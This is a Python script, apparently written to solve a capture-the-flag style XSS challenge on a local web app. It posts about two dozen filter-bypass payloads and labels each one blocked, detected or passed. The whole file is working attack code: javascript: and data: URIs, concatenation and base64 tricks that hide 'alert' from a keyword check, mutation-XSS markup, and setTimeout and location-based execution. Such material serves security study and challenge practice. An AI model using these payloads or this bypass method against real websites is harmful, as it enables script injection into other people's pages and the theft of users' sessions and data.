import requests
import re

url = "http://127.0.0.1:33031/page"

print("=" * 70)
print("FINDING ACTUAL CONFIRMED BYPASS (XSS without 'alert' string)")
print("=" * 70)

# Need to avoid BOTH the on\w+ pattern detection AND the 'alert' string detection

# Key insight: The alert detection happens after the on\w+ pattern is stripped
# So maybe we need to:
# 1. Avoid the on\w+ pattern entirely (use different attribute)
# 2. OR encode 'alert' in a way that bypasses the check

bypass_tests = [
    # Don't use on\w+ at all - use other JavaScript vectors
    ('href with data scheme', '<a href="data:text/html,<script>alert(1)</script>">click</a>'),
    ('href with JS and concat', '<a href="javascript:window["ale"+"rt"](1)">click</a>'),
    
    # Use exotic event handlers not matching on\w+
    ('accesskey', '<input accesskey="X" onclick="alert(1)" value="Press Alt+X">'),  # has onclick
    
    # Try to bypass alert detection with encoding/concatenation
    ('eval concat inside onerror', '<img src=x onerror=eval("ale".concat("rt(1)"))>'),
    ('execScript', '<img src=x onerror=execScript("alert(1)","javascript")>'),  # IE only
    
    # Alternative ways to trigger JavaScript execution
    ('form action', '<form action="javascript:alert(1)"><input type=submit></form>'),
    ('isindex action', '<isindex action="javascript:alert(1)" type=image>'),  # deprecated
    
    # Base64 wrapped in unusual ways
    ('atob with base padding', '<img src=x onerror=eval(window[\'atob\'](\'YWxlcnQoMSk=\'))>'),
    ('fromCharCode array', '<img src=x onerror=window[([\'ale\',\'rt\'].join(\'\'))](1)>'),
    
    # Mutation/encoding tricks
    ('svg animate with values', '<svg><animate attributeName=href values="javascript:alert(1)" /><a><rect width=100 height=100 /></a></svg>'),
    ('math with xss', '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>'),  # mutation
    
    # Try accessing alert via alternative property paths
    ('window alert', '<img src=x onerror=window.alert(1)>'),
    ('self alert', '<img src=x onerror=self.alert(1)>'),
    ('top alert', '<img src=x onerror=top.alert(1)>'),
    ('parent alert', '<img src=x onerror=parent.alert(1)>'),
    ('this alert', '<img src=x onerror=this.alert(1)>'),  # won't work
    
    # Completely different functions
    ('print function', '<img src=x onerror=print()>.'),  # might trigger print dialog
    ('confirm function', '<img src=x onerror=confirm(1)>'),  # likely detected
    ('prompt function', '<img src=x onerror=prompt(1)>'),  # likely detected
    ('open function', '<img src=x onerror=open("javascript:alert(1)")>'),  # popup
    
    # Location manipulation
    ('location assign', '<img src=x onerror=location.assign("javascript:alert(1)")>'),
    ('location href', '<img src=x onerror=location.href="javascript:alert(1)">'),
    
    # Timing-based execution
    ('setTimeout', '<img src=x onerror=setTimeout("alert(1)",0)>'),  # has alert
    ('setTimeout concat', '<img src=x onerror=setTimeout("ale"+"rt(1)",0)>'),
]

results = []
for name, payload in bypass_tests:
    resp = requests.post(url, data={"solution": payload})
    
    # Determine outcome
    if resp.status_code == 404:
        status = "FILTER_BLOCKED"
    elif "unconfigurable property" in resp.text.lower():
        status = "ALERT_DETECTED"
    elif "error_star.png" in resp.text or "Oops! You did" in resp.text:
        status = "XSS_DETECTED"  
    elif "Good Luck" in resp.text:
        status = "PASSED_FILTER"
    else:
        status = f"UNKNOWN (len={len(resp.text)})"
    
    results.append((name, payload, status))
    print(f"[{status}] {name}")

print("\n" + "=" * 70)
print("DETAILED ANALYSIS OF INTERESTING PAYLOADS")
print("=" * 70)

for name, payload, status in results:
    if status in ["PASSED_FILTER"]:
        print(f"\n[{status}] {name}")
        print(f"Payload: {payload}")
        
        # Get response again
        resp = requests.post(url, data={"solution": payload})
        
        # Check if payload was modified in output
        match = re.search(r'<div class="solution-text"[^>]*>(.*?)</div>', resp.text, re.DOTALL)
        if match:
            content = match.group(1)
            print(f"Response content: {content}")

